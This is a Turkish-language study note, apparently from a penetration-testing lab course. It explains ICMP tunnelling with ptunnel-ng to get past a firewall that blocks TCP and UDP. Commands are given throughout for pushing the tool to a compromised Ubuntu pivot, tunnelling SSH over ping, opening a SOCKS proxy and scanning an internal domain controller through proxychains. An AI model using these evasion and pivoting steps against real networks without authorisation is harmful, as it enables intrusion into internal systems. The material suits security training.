# ICMP Tünelleme


Bu modülde anlatılan şey, ağda TCP (22, 80, 443) veya UDP portları **tamamen kapalıysa** ne yapacağımızdır. Güvenlik duvarları genellikle ağın çalışıp çalışmadığını test etmek için **ICMP (Ping)** paketlerine izin verir. Biz de bu açığı kullanarak, SSH trafiğimizi (TCP) Ping (ICMP) paketlerinin içine saklayıp dışarı sızdırıyoruz.

Yine **A-B-C** mantığıyla, not alacağın komutlarla birlikte özetliyorum:

**Makineler:**
*   **A (Saldırgan):** Senin Kali makinen.
*   **B (Pivot/Ubuntu):** İç ağa bakan, ele geçirdiğin Ubuntu makinesi (Dış: 10.129.202.64).
*   **C (Hedef):** İç ağdaki Windows DC makinesi (172.16.5.19).

---

### Not Alacağın Kodlar ve Adımlar

**1. Adım: Aracı İndir ve Derle (A Makinesinde)**
`ptunnel-ng` aracını indirip derliyoruz. Derleme bittikten sonra bu klasörü komple B makinesine atacağız.
```bash
git clone https://github.com/utoni/ptunnel-ng.git
cd ptunnel-ng
sudo ./autogen.sh
```

**2. Adım: Aracı B Makinesine Gönder (A'dan B'ye)**
```bash
scp -r ptunnel-ng ubuntu@10.129.202.64:~/
```

**3. Adım: Sunucuyu Başlat (B Makinesinde)**
B makinesine SSH ile bağlan ve sunucuyu başlat. Bu komut, dışarıdan (A'dan) gelen ICMP paketlerini dinler ve B'nin kendi SSH portuna (22) yönlendirir.
```bash
cd ptunnel-ng
sudo ./ptunnel-ng -r 10.129.202.64 -R 22
```
*   **`-r`**: B makinesinin kendi IP'si.
*   **`-R`**: B makinesindeki hedef port (SSH için 22).

**4. Adım: İstemciyi Başlat (A Makinesinde)**
A makinesinde istemciyi çalıştırıyoruz. Bu komut, A makinesinde 2222 portunu açar ve buraya gelen trafiği ICMP paketleri içine sarıp B'ye gönderir.
```bash
sudo ./ptunnel-ng -p 10.129.202.64 -l 2222 -r 10.129.202.64 -R 22
```
*   **`-p`**: Pivot (B) makinesinin IP'si.
*   **`-l`**: A makinesinde dinlenecek yerel port (2222).
*   **`-r`**: B makinesinin IP'si.
*   **`-R`**: B makinesindeki hedef port (22).

**5. Adım: SSH ile Tünele Bağlan (A Makinesinde)**
Artık B makinesine ICMP üzerinden bağlanabilirsin. Dikkat et, hedef IP olarak `127.0.0.1` ve port olarak `2222` yazıyoruz (çünkü ptunnel A makinesinde 2222'yi dinliyor).
```bash
ssh ubuntu@127.0.0.1 -p 2222
```

**6. Adım: Tünel Üzerinden Dinamik Port Yönlendirme (SOCKS) (A Makinesinde)**
Sadece SSH ile kalmayıp, bu tüneli C makinesine (iç ağa) sızmak için SOCKS proxy olarak da kullanabiliriz. Yeni bir terminalde:
```bash
ssh -D 9050 ubuntu@127.0.0.1 -p 2222
```
*(Artık 9050 portunda bir SOCKS proxy var ve bu proxy ICMP tünelinden geçiyor).*

**7. Adım: Hedefe Sız (A Makinesinde)**
Proxychains ile iç ağdaki C makinesini tarayabilir veya RDP atabilirsin:
```bash
proxychains nmap -sT -p 3389 172.16.5.19
```

---